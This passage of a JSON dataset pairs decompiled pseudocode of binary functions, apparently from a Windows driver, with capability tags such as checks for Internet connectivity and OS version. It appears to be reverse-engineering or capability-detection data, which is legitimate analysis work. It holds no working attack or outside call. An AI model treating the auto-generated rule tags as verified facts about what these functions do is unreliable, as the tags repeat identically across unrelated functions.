        "decompiled_code": "\nint32_t __cdecl fcn.0003df90(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_ch = 0;\n    fcn.00037640(0x800ce848, &var_4h, 0);\n    iVar1 = fcn.0003f990(arg_8h, 1);\n    if (iVar1 == 0) {\n        var_ch = 0;\n    }\n    else {\n        var_ch = *(iVar1 + 0xc);\n    }\n    *arg_ch = var_ch;\n    fcn.00037670(0x800ce848, &var_4h, 0);\n    return (-(iVar1 != 0) & 0x3fffffff) + 0xc0000001;\n}\n",
        "token_count": 195
    },
    "0003e010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003e010(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00037640(0x800ce848, &var_4h, 1);\n    var_8h = NULL;\n    for (var_ch = *0x800ce840; (var_ch != NULL && (var_ch[2] != arg_8h)); var_ch = *var_ch) {\n        var_8h = var_ch;\n    }\n    if (var_ch != NULL) {\n        if (var_8h == NULL) {\n            *0x800ce840 = *var_ch;\n        }\n        else {\n            *var_8h = *var_ch;\n        }\n        *0x800ce844 = *0x800ce844 + -1;\n    }\n    fcn.00037670(0x800ce848, &var_4h, 1);\n    if (var_ch == NULL) {\n        uVar1 = 0xc0000225;\n    }\n    else {\n        fcn.000376a0(var_ch + 0x10c);\n        fcn.00034540(var_ch + 5);\n        fcn.000357f0(var_ch[0x109]);\n        fcn.000357f0(var_ch);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 321
    },
    "0003e100": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_214h\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.0003e100(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_214h;\n    uint var_210h;\n    uint var_200h;\n    uint var_12h;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = NULL;\n    fcn.000789c6(&var_210h, 0x100, 0x80054fe4, arg_8h, 0);\n    var_12h._0_2_ = 0;\n    fcn.00037640(0x800ce848, &var_8h, 1);\n    if (*0x800ce844 < 0x65) {\n        var_ch = *0x800ce840;\n        var_4h = 0;\n        while ((var_ch != NULL && (iVar1 = fcn.000789f6(&var_210h, var_ch + 0x22),  iVar1 != 0))) {\n            var_ch = *var_ch;\n            var_4h = var_4h + 1;\n        }\n        if ((var_ch == NULL) && (var_ch = fcn.000356f0(0x45c),  var_ch != NULL)) {\n            fcn.00078bfa(var_ch, 0, 0x45c);\n            *var_ch = 0;\n            fcn.00078a08(var_ch + 0x22, &var_210h, 0x100);\n            *(var_ch + 0x108) = 0;\n            fcn.00078a08(var_ch + 0x222, &var_200h, 0x100);\n            *(var_ch + 0x108) = 0;\n            if (*(var_ch + 0x222) == 0x24) {\n                var_ch[4] = 1;\n            }\n            var_ch[2] = var_4h + 1;\n            var_ch[0x10b] = 9;\n            fcn.00037440(var_ch + 0x10c);\n            fcn.000344b0(var_ch + 5);\n            *var_ch = *0x800ce840;\n            *0x800ce840 = var_ch;\n            *0x800ce844 = *0x800ce844 + 1;\n        }\n    }\n    fcn.00037670(0x800ce848, &var_8h, 1);\n    return var_ch;\n}\n",
        "token_count": 586
    },
    "0003e2d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003e2d0(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce848, &var_4h, 0);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = 0;\n    }\n    for (var_8h = *0x800ce854; (var_8h != NULL && (var_8h[2] != arg_8h)); var_8h = *var_8h) {\n        if (arg_10h != NULL) {\n            *arg_10h = var_8h;\n        }\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce848, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 229
    },
    "0003e3c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003e3c0(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    int32_t var_154h;\n    uint var_150h;\n    int32_t var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    int32_t var_a0h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_c4h = 0;\n    var_cch = 0;\n    var_c0h = 0;\n    if ((arg_8h == NULL) || (arg_8h[6] == 0)) {\n        var_c4h = 0x21590065;\n    }\n    else {\n        fcn.000789c0(&var_8h, 0x80054764);\n        puVar2 = arg_8h;\n        puVar3 = &var_b8h;\n        for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_c8h = *(var_a0h + 0x14);\n        var_c4h = fcn.0003e9e0(arg_8h, &var_8h, &var_150h, &var_cch, &var_c0h);\n        if (var_c4h == 0) {\n            *0x800db6a0 = fcn.00042060(var_c0h, 0xcc, &var_150h, 0x7c);\n            if (*0x800db6a0 != -1) {\n                *0x800db6a8 = *0x800db6a0 + 1;\n                *0x800db6a4 = *0x800db6a0;\n            }\n            *0x800db6b0 = fcn.0003e360(var_c0h, 0x100, 0x8007ecb0);\n            if (*0x800db6b0 == -1) {\n                var_c4h = 0x21590005;\n            }\n            else {\n                *0x800db6bc = fcn.0003e360(var_c0h, 0x100, 0x8007ec90);\n                if (*0x800db6bc == -1) {\n                    var_c4h = 0x21590005;\n                }\n                else {\n                    *0x800db6c4 = fcn.0003e360(var_c0h, 0x100, 0x8007ec70);\n                    if (*0x800db6c4 == -1) {\n                        var_c4h = 0x21590005;\n                    }\n                    else {\n                        *0x800db6cc = fcn.0003e360(var_c0h, 0x100, 0x8007ec50);\n                        if (*0x800db6cc == -1) {\n                            var_c4h = 0x21590005;\n                        }\n                        else {\n                            *0x800db6d4 = fcn.0003e360(var_c0h, 0x100, 0x8007ec30);\n                            if (*0x800db6d4 == -1) {\n                                var_c4h = 0x21590005;\n                            }\n                            else {\n                                *0x800db6e4 = fcn.0003e360(var_c0h, 0x100, 0x8007ec10);\n                                if (*0x800db6e4 == -1) {\n                                    var_c4h = 0x21590005;\n                                }\n                                else {\n                                    *0x800db6e8 = fcn.0003e360(var_c0h, 0x100, 0x8007ebf0);\n                                    if (*0x800db6e8 == -1) {\n                                        var_c4h = 0x21590005;\n                                    }\n                                    else {\n                                        *0x800db6d8 = fcn.0003e360(var_c0h, 0x100, 0x8007ebd0);\n                                        if (*0x800db6d8 == -1) {\n                                            var_c4h = 0x21590005;\n                                        }\n                                        else {\n                                            *0x800db6dc = fcn.0003e360(var_c0h, 0x100, 0x8007ebb0);\n                                            if (*0x800db6dc == -1) {\n                                                var_c4h = 0x21590005;\n                                            }\n                                            else {\n                                                *0x800db6ec = fcn.0003e360(var_c0h, 0x100, 0x8007eb90);\n                                                if (*0x800db6ec == -1) {\n                                                    var_c4h = 0x21590005;\n                                                }\n                                                else {\n                                                    *0x800db6c0 = fcn.0003e360(var_c0h, 0x100, 0x8007eb70);\n                                                    if (*0x800db6c0 == -1) {\n                                                        var_c4h = 0x21590005;\n                                                    }\n                                                    else {\n                                                        *0x800db6c8 = fcn.0003e360(var_c0h, 0x100, 0x8007eb50);\n                                                        if (*0x800db6c8 == -1) {\n                                                            var_c4h = 0x21590005;\n                                                        }\n                                                        else {\n                                                            *0x800db708 = fcn.0003e360(var_c0h, 0x100, 0x8007eb30);\n                                                            if (*0x800db708 == -1) {\n                                                                var_c4h = 0x21590005;\n                                                            }\n                                                            else {\n                                                                *0x800db70c = fcn.0003e360(var_c0h, 0x100, 0x8007eb10);\n                                                                if (*0x800db70c == -1) {\n                                                                    var_c4h = 0x21590005;\n                                                                }\n                                                                else {\n                                                                    *0x800db710 = fcn.0003e360(var_c0h, 0x100, \n                                                                                               0x8007eaf0);\n                                                                    if (*0x800db710 == -1) {\n                                                                        var_c4h = 0x21590005;\n                                                                    }\n                                                                    else {\n                                                                        *0x800db6ac = fcn.0003e360(var_c0h, 0x100, \n                                                                                                   var_cch);\n                                                                        if (*0x800db6ac == -1) {\n                                                                            var_c4h = 0x21590005;\n                                                                        }\n                                                                        else if (arg_ch != NULL) {\n                                                                            *arg_ch = 0;\n                                                                            *arg_10h = 0;\n                                                                            iVar1 = fcn.000356f0(4);\n                                                                            *arg_ch = iVar1;\n                                                                            if (*arg_ch == 0) {\n                                                                                var_c4h = -0x3fffff66;\n                                                                            }\n                                                                            else {\n                                                                                **arg_ch = 0;\n                                                                                fcn.0001ae20(2, &var_ch, &var_bch);\n                                                                                var_154h = var_c0h;\ncode_r0x0003e878:\n                                                                                if ((var_154h == 0) || (*arg_ch == 0))\n                                                                                goto code_r0x0003e974;\n                                                                                if ((var_154h == var_c0h) ||\n                                                                                   (*(var_154h + 0xe) == '\\0')) {\ncode_r0x0003e869:\n                                                                                    var_154h = *(var_154h + 4);\n                                                                                    goto code_r0x0003e878;\n                                                                                }\n                                                                                iVar1 = fcn.00035720(arg_ch, *arg_10h <<\n                                                                                                             2, \n                                                                                                     *arg_10h * 4 + 4);\n                                                                                if (iVar1 == 0) {\n                                                                                    *arg_ch[*arg_10h] = var_154h;\n                                                                                    *arg_10h = *arg_10h + 1;\n                                                                                    goto code_r0x0003e869;\n                                                                                }\n                                                                                var_c4h = -0x3fffff66;\n                                                                                fcn.000357f0(*arg_ch);\n                                                                                *arg_ch = 0;\n                                                                                *arg_10h = 0;\ncode_r0x0003e974:\n                                                                                fcn.0001af70(var_ch, var_bch);\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        if (var_c0h != 0) {\n            (**0x80051044)(var_c0h);\n        }\n        if (var_cch != 0) {\n            (**0x80051038)(var_cch, 0);\n        }\n        *(var_a0h + 0x14) = var_c8h;\n        puVar2 = &var_b8h;\n        for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *arg_8h = *puVar2;\n            puVar2 = puVar2 + 1;\n            arg_8h = arg_8h + 1;\n        }\n    }\n    return var_c4h;\n}\n",
        "token_count": 2163
    },
    "0003e9e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003e9e0(uint arg_8h, uint arg_ch, uchar *arg_10h, int32_t *arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    (**0x80051078)(arg_14h, arg_8h, arg_ch, 0);\n    if (*arg_14h == 0) {\n        uVar1 = 0xc0000001;\n    }\n    else {\n        fcn.00078bfa(arg_10h, 0, 0x7c);\n        *arg_10h = 5;\n        arg_10h[1] = 1;\n        *(arg_10h + 8) = 0x8007ecb0;\n        *(arg_10h + 0xc) = 0;\n        *(arg_10h + 0x10) = 0;\n        *(arg_10h + 0x14) = 0x8007ec90;\n        *(arg_10h + 0x1c) = 0x8007ec70;\n        *(arg_10h + 0x24) = 0x8007ec50;\n        *(arg_10h + 0x2c) = 0x8007ec30;\n        *(arg_10h + 0x3c) = 0x8007ec10;\n        *(arg_10h + 0x40) = 0x8007ebf0;\n        *(arg_10h + 0x30) = 0x8007ebd0;\n        *(arg_10h + 0x34) = 0x8007ebb0;\n        *(arg_10h + 0x44) = 0x8007eb90;\n        *(arg_10h + 0x18) = 0x8007eb70;\n        *(arg_10h + 0x20) = 0x8007eb50;\n        *(arg_10h + 0x60) = 0x8007eb30;\n        *(arg_10h + 100) = 0x8007eb10;\n        *(arg_10h + 0x68) = 0x8007eaf0;\n        uVar1 = (**0x8005103c)(*arg_14h, arg_10h, 0x7c, arg_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 542
    },
    "0003ecd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003ecd0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_140h;\n    int32_t var_c0h;\n    uint var_bch;\n    int32_t var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    int32_t var_98h;\n    uint var_8h;\n    \n    var_b4h = 0x4e4d4944;\n    fcn.000789c0(&var_8h, 0x80054764);\n    puVar2 = arg_8h;\n    puVar3 = &var_b0h;\n    for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    var_bch = *(var_98h + 0x14);\n    var_b8h = fcn.0003f0e0(arg_8h, &var_8h, &var_140h);\n    if (var_b8h == 0) {\n        var_c0h = (**0x80051218)(arg_8h, var_b4h);\n        if (var_c0h == 0) {\n            var_b8h = -0x3fffffff;\n        }\n        else {\n            *0x800db620 = fcn.00042060(var_c0h, 0xdc, &var_140h, 0x7c);\n            if (*0x800db620 != -1) {\n                *0x800db628 = *0x800db620 + 1;\n                *0x800db624 = *0x800db620;\n            }\n            *0x800db62c = fcn.0003e360(var_c0h, 0x100, 0x8007f1e0);\n            if (*0x800db62c == -1) {\n                var_b8h = 0x21590005;\n            }\n            else {\n                *0x800db638 = fcn.0003e360(var_c0h, 0x100, 0x8007f200);\n                if (*0x800db638 == -1) {\n                    var_b8h = 0x21590005;\n                }\n                else {\n                    *0x800db640 = fcn.0003e360(var_c0h, 0x100, 0x8007f220);\n                    if (*0x800db640 == -1) {\n                        var_b8h = 0x21590005;\n                    }\n                    else {\n                        *0x800db648 = fcn.0003e360(var_c0h, 0x100, 0x8007f240);\n                        if (*0x800db648 == -1) {\n                            var_b8h = 0x21590005;\n                        }\n                        else {\n                            *0x800db650 = fcn.0003e360(var_c0h, 0x100, 0x8007f260);\n                            if (*0x800db650 == -1) {\n                                var_b8h = 0x21590005;\n                            }\n                            else {\n                                *0x800db660 = fcn.0003e360(var_c0h, 0x100, 0x8007f280);\n                                if (*0x800db660 == -1) {\n                                    var_b8h = 0x21590005;\n                                }\n                                else {\n                                    *0x800db664 = fcn.0003e360(var_c0h, 0x100, 0x8007f2a0);\n                                    if (*0x800db664 == -1) {\n                                        var_b8h = 0x21590005;\n                                    }\n                                    else {\n                                        *0x800db658 = fcn.0003e360(var_c0h, 0x100, 0x8007f2c0);\n                                        if (*0x800db658 == -1) {\n                                            var_b8h = 0x21590005;\n                                        }\n                                        else {\n                                            *0x800db668 = fcn.0003e360(var_c0h, 0x100, 0x8007f2e0);\n                                            if (*0x800db668 == -1) {\n                                                var_b8h = 0x21590005;\n                                            }\n                                            else {\n                                                *0x800db63c = fcn.0003e360(var_c0h, 0x100, 0x8007f300);\n                                                if (*0x800db63c == -1) {\n                                                    var_b8h = 0x21590005;\n                                                }\n                                                else {\n                                                    *0x800db644 = fcn.0003e360(var_c0h, 0x100, 0x8007f320);\n                                                    if (*0x800db644 == -1) {\n                                                        var_b8h = 0x21590005;\n                                                    }\n                                                    else {\n                                                        *0x800db684 = fcn.0003e360(var_c0h, 0x100, 0x8007f340);\n                                                        if (*0x800db684 == -1) {\n                                                            var_b8h = 0x21590005;\n                                                        }\n                                                        else {\n                                                            *0x800db688 = fcn.0003e360(var_c0h, 0x100, 0x8007f360);\n                                                            if (*0x800db688 == -1) {\n                                                                var_b8h = 0x21590005;\n                                                            }\n                                                            else {\n                                                                *0x800db68c = fcn.0003e360(var_c0h, 0x100, 0x8007f380);\n                                                                if (*0x800db68c == -1) {\n                                                                    var_b8h = 0x21590005;\n                                                                }\n                                                                else {\n                                                                    var_b8h = 0;\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if (*0x800ce7e4 != 0) {\n        (**0x80051038)(*0x800ce7e4, 0);\n    }\n    *(var_98h + 0x14) = var_bch;\n    puVar2 = &var_b0h;\n    for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *arg_8h = *puVar2;\n        puVar2 = puVar2 + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return var_b8h;\n}\n",
        "token_count": 1513
    },
    "0003f0e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003f0e0(uint arg_8h, uint arg_ch, uchar *arg_10h)\n\n{\n    uint uVar1;\n    \n    (**0x80051078)(0x800ce7e4, arg_8h, arg_ch, 0);\n    if (*0x800ce7e4 == 0) {\n        uVar1 = 0xc0000001;\n    }\n    else {\n        fcn.00078bfa(arg_10h, 0, 0x7c);\n        *arg_10h = 5;\n        arg_10h[1] = 1;\n        *(arg_10h + 8) = 0x8007f1e0;\n        *(arg_10h + 0xc) = 0;\n        *(arg_10h + 0x10) = 0;\n        *(arg_10h + 0x14) = 0x8007f200;\n        *(arg_10h + 0x1c) = 0x8007f220;\n        *(arg_10h + 0x24) = 0x8007f240;\n        *(arg_10h + 0x2c) = 0x8007f260;\n        *(arg_10h + 0x3c) = 0x8007f280;\n        *(arg_10h + 0x40) = 0x8007f2a0;\n        *(arg_10h + 0x34) = 0x8007f2c0;\n        *(arg_10h + 0x44) = 0x8007f2e0;\n        *(arg_10h + 0x18) = 0x8007f300;\n        *(arg_10h + 0x20) = 0x8007f320;\n        *(arg_10h + 0x60) = 0x8007f340;\n        *(arg_10h + 100) = 0x8007f360;\n        *(arg_10h + 0x68) = 0x8007f380;\n        uVar1 = (**0x80051034)(*0x800ce7e4, arg_10h, 0x7c);\n    }\n    return uVar1;\n}\n",
        "token_count": 513
    },
    "0003f3a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0003f3a0(void)\n\n{\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_4h;\n    \n    var_7ch = 0;\n    var_4h = fcn.0003f660(&var_78h, &var_7ch);\n    if (var_4h == 0) {\n        *0x800ce7f4 = fcn.0003e360(var_7ch, 0x100, 0x8007f770);\n        if (*0x800ce7f4 == -1) {\n            var_4h = 0x21590005;\n        }\n        else {\n            *0x800ce7f8 = fcn.0003e360(var_7ch, 0x100, 0x8007f790);\n            if (*0x800ce7f8 == -1) {\n                var_4h = 0x21590005;\n            }\n            else {\n                *0x800ce7fc = fcn.0003e360(var_7ch, 0x100, 0x8007f7b0);\n                if (*0x800ce7fc == -1) {\n                    var_4h = 0x21590005;\n                }\n                else {\n                    *0x800ce800 = fcn.0003e360(var_7ch, 0x100, 0x8007f7d0);\n                    if (*0x800ce800 == -1) {\n                        var_4h = 0x21590005;\n                    }\n                    else {\n                        *0x800ce804 = fcn.0003e360(var_7ch, 0x100, 0x8007f7f0);\n                        if (*0x800ce804 == -1) {\n                            var_4h = 0x21590005;\n                        }\n                        else {\n                            *0x800ce808 = fcn.0003e360(var_7ch, 0x100, 0x8007f810);\n                            if (*0x800ce808 == -1) {\n                                var_4h = 0x21590005;\n                            }\n                            else {\n                                *0x800ce80c = fcn.0003e360(var_7ch, 0x100, 0x8007f830);\n                                if (*0x800ce80c == -1) {\n                                    var_4h = 0x21590005;\n                                }\n                                else {\n                                    *0x800ce810 = fcn.0003e360(var_7ch, 0x100, 0x8007f850);\n                                    if (*0x800ce810 == -1) {\n                                        var_4h = 0x21590005;\n                                    }\n                                    else {\n                                        *0x800ce814 = fcn.0003e360(var_7ch, 0x100, 0x8007f870);\n                                        if (*0x800ce814 == -1) {\n                                            var_4h = 0x21590005;\n                                        }\n                                        else {\n                                            *0x800ce818 = fcn.0003e360(var_7ch, 0x100, 0x8007f890);\n                                            if (*0x800ce818 == -1) {\n                                                var_4h = 0x21590005;\n                                            }\n                                            else {\n                                                *0x800ce81c = fcn.0003e360(var_7ch, 0x100, 0x8007f8f0);\n                                                if (*0x800ce81c == -1) {\n                                                    var_4h = 0x21590005;\n                                                }\n                                                else {\n                                                    *0x800ce820 = fcn.0003e360(var_7ch, 0x100, 0x8007f8b0);\n                                                    if (*0x800ce820 == -1) {\n                                                        var_4h = 0x21590005;\n                                                    }\n                                                    else {\n                                                        *0x800ce824 = fcn.0003e360(var_7ch, 0x100, 0x8007f8d0);\n                                                        if (*0x800ce824 == -1) {\n                                                            var_4h = 0x21590005;\n                                                        }\n                                                        else {\n                                                            *0x800ce828 = fcn.0003e360(var_7ch, 0x100, 0x8007f910);\n                                                            if (*0x800ce828 == -1) {\n                                                                var_4h = 0x21590005;\n                                                            }\n                                                            else {\n                                                                var_4h = 0;\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        (**0x8005102c)(&var_4h, var_7ch);\n    }\n    return var_4h;\n}\n",
        "token_count": 1075
    },
    "0003f990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003f990(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce848, &var_4h, 0);\n    }\n    for (var_8h = *0x800ce840; (var_8h != NULL && (var_8h[2] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce848, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 172
    },
    "0003fa00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003fa00(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t *piVar1;\n    uint var_1ch;\n    uint var_14h;\n    int16_t *var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0xc0000225;\n    fcn.00037640(0x800ce848, &var_8h, 0);\n    var_ch = *0x800ce840;\n    while( true ) {\n        if (var_ch == NULL) goto code_r0x0003faab;\n        if (var_ch[2] == arg_8h) break;\n        var_ch = *var_ch;\n    }\n    var_10h = 0x80055020;\n    piVar1 = var_10h;\n    do {\n        var_10h = piVar1;\n        piVar1 = var_10h + 1;\n    } while (*var_10h != 0);\n    fcn.00078a08(arg_ch, var_ch + (var_10h + 0x3ffd57f0 >> 1) * 2 + 0x22, arg_10h);\n    *(arg_ch + -2 + arg_10h * 2) = 0;\n    var_4h = 0;\ncode_r0x0003faab:\n    fcn.00037670(0x800ce848, &var_8h, 0);\n    return var_4h;\n}\n",
        "token_count": 361
    },
    "0003fad0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0003fad0(void)\n\n{\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = -0x3fffffff;\n    var_4h = -0x3fffffff;\n    (**0x80051028)();\n    var_10h = fcn.00038620();\n    if (((var_10h == 0) && (var_10h = fcn.00047f50(0x80092f40, 0x8007d540),  var_10h == 0)) &&\n       (var_10h = fcn.0003fd40(*0x800ce7e0),  var_10h == 0)) {\n        var_8h = fcn.0003ecd0(*0x800ce3c4);\n        var_4h = fcn.000432d0(*0x800ce3c4);\n        var_10h = fcn.0003b020();\n        if (((var_10h == 0) && (var_10h = fcn.0003dd50(),  var_10h == 0)) && (var_10h = fcn.0003cd00(),  var_10h == 0))\n        {\n            if (var_8h == 0) {\n                var_8h = fcn.0003f3a0(*0x800ce3c4);\n            }\n            if (var_8h == 0) {\n                var_8h = fcn.00038f90(*0x800ce3c4);\n            }\n            if (var_4h == 0) {\n                var_4h = fcn.00039ce0(*0x800ce3c4);\n            }\n            var_10h = fcn.00051c20();\n        }\n    }\n    if (var_10h == 0) {\n        if ((var_4h == 0) || (var_8h == 0)) {\n            var_10h = 0;\n        }\n        else {\n            var_10h = -0x3fffffff;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 495
    },
    "0003fc00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0003fc00(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00035150();\n    iVar2 = fcn.000533b0(0x800ce878, 1, 0);\n    if (iVar2 == 0) {\n        fcn.0003f930();\n        if (iVar1 < 0x1b) {\n            fcn.00047f50(0x80092f40, 0);\n            iVar1 = fcn.00051c20();\n            if (iVar1 == 0) {\n                fcn.0003fda0();\n                fcn.0004e200();\n            }\n        }\n        else {\n            iVar1 = fcn.0003fad0();\n            if (iVar1 == 0) {\n                fcn.0003fda0();\n                fcn.0004e200();\n            }\n            fcn.00047000();\n        }\n    }\n    else {\n        iVar1 = 0x21590006;\n    }\n    return iVar1;\n}\n",
        "token_count": 254
    },
    "0003fd10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0003fd10(void)\n\n{\n    if (*0x800ce874 != 0) {\n        (**0x800ce714)(*0x800ce874);\n        *0x800ce874 = 0;\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "0003fd40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0003fd40(uint arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uchar var_ch;\n    uchar var_bh;\n    ushort var_ah;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x800ce874 == 0) {\n        var_10h._0_1_ = 0x80;\n        var_10h._1_1_ = 1;\n        var_10h._2_2_ = 0x10;\n        var_ch = 0;\n        var_ah = 8;\n        var_8h = 0x6f6e624c;\n        var_bh = 1;\n        var_4h = 0x640;\n        *0x800ce874 = (**0x800ce710)(arg_8h, &var_10h);\n    }\n    return 0;\n}\n",
        "token_count": 215
    },
    "0003fda0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
